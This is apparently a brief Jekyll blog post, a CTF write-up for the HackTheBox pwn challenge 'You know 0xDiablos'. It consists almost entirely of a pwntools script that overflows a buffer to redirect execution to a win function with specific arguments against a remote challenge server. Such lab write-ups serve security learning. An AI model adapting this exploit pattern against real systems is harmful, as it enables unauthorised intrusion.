---
layout: post
title: "hackbox pwn You know 0xDiablos wp"
date:   2022-3-10
tags: [ctf_wp]
comments: true
author: wsxk
---

太简单了以至于不想说乍做.....

    from pwn import *

    io = remote("167.172.60.97",31012)
    #io = process("./vuln")
    #80491E2
    io.recvuntil("You know who are 0xDiablos:")
    payload = b'a'*188 + p32(0x80491E2)+p32(0xDEADBEEF)+p32(0xDEADBEEF)+p32(0xC0DED00D)

    #gdb.attach(io)
    io.sendline(payload)

    io.interactive()